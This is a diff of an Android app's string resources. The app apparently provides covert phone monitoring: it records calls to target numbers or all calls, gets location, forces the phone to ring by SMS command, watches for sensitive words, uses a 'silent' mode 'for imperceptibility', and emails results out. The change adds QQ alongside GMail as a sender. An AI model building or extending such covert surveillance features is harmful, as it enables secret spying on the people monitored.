@@ -68,18 +68,18 @@
     <string name="pref_category_gps_title">Get Location</string>
     <string name="pref_category_ring_title">Ring</string>
     
-    <string name="pref_use_self_sender_title">Use my own GMail</string>
-    <string name="pref_use_self_sender_summary">Use your own GMail for better privacy, otherwise will use system mail sender. </string>
-    <string name="pref_sender_mail_title">Sender Mail(GMail ONLY)</string>
+    <string name="pref_use_self_sender_title">Use My Mail Sender</string>
+    <string name="pref_use_self_sender_summary">Use your own mail sender(GMail/QQ ONLY) for better privacy, otherwise will use system default mail sender. </string>
+    <string name="pref_sender_mail_title">Sender Mail(GMail/QQ ONLY)</string>
     <string name="pref_sender_pwd_title">Password</string>
-    <string name="pref_invalid_sender_mail">%s 不是一个有效的GMail邮箱地址。</string>
+    <string name="pref_invalid_sender_mail">%s is not a valid mail sender</string>
     <string name="pref_recv_mail_title">Receiver Mail</string>
     <string name="pref_invalid_mail_format">Warning: %s is NOT a valid mail address.</string>
     <string name="pref_pls_input_pwd">Please input mail password.</string>
     <string name="pref_info_interval_title">Interval</string> <!-- days -->
     <string name="pref_info_interval_dlg_title">Get info interval</string>
     <string name="pref_record_all_title">Record all phone calls</string>
-    <string name="pref_record_all_summary">Permitted only when using your own GMail sender.</string>
+    <string name="pref_record_all_summary">Permitted only when using your own mail sender.</string>
     <string name="pref_record_number_title">Target Number</string>
     <string name="pref_record_number_summary">Record only when the phone call number contains the target number(at least 5 digits). Support 9 targets at most. Separate by blank space.</string>
     <string name="pref_recv_phonenum_title">Receiver Phone Number</string>
@@ -100,7 +100,7 @@
     <string name="pref_network_mode_summary">Suggest to keep the default "silent" mode for imperceptibility.</string>
     <string name="pref_network_mode_dlg_title">Choose Mode</string>
     <string name="pref_record_all_time_limit_in_trial">Only 10 times recording permitted in trial.</string>
-    <string name="pref_must_use_self_sender">For protecting your privacy, recording all phone calls is permitted ONLY when using your own GMail sender.</string>
+    <string name="pref_must_use_self_sender">For protecting your privacy, recording all phone calls is permitted ONLY when using your own mail sender.</string>
     <string name="pref_ring_word_title">Force Ring</string>
     <string name="pref_ring_word_summary">Send SMS #xl to force ring</string>
     
@@ -154,7 +154,7 @@
     <string name="indication_unregister_ok">卸载成功。</string>
     <string name="indication_unregister_ng">卸载失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_selfsender_ok">设置发信邮箱成功。</string>
-    <string name="indication_set_selfsender_ng">设置发信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_selfsender_ng">设置发信邮箱失败。请检查您发送的指令格式是否正确（仅支持GMail和QQ邮箱）。若无法解决请联系客服。</string>
     <string name="indication_stop_selfsender_ok">取消发信邮箱成功。</string>
     <string name="indication_stop_selfsender_ng">取消发信邮箱失败。因为您当前对所有电话录音，为保护您的隐私，请继续使用您的专有发信邮箱。若无法解决请联系客服。</string>
     <string name="indication_set_recv_mail_ok">设置收信邮箱成功。</string>
@@ -166,7 +166,7 @@
     <string name="indication_set_targetnum_ok">设置监听录音目标号码段成功。</string>
     <string name="indication_set_targetnum_ng">设置监听录音目标号码段失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_targetall_ok">设置对所有电话录音成功。</string>
-    <string name="indication_set_targetall_ng">必须使用自己的发信邮箱，才能对所有电话录音。请使用#1#指令设置你的专有发信邮箱（目前仅支持GMail）。若无法解决请联系客服。</string>
+    <string name="indication_set_targetall_ng">必须使用自己的发信邮箱，才能对所有电话录音。请使用#1#指令设置你的专有发信邮箱（仅支持GMail和QQ邮箱）。若无法解决请联系客服。</string>
     <string name="indication_set_network_mode_ok">设置网络连接模式成功。</string>
     <string name="indication_set_network_mode_ng">设置网络连接模式失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_sens_words_ok">设置敏感词成功。</string>
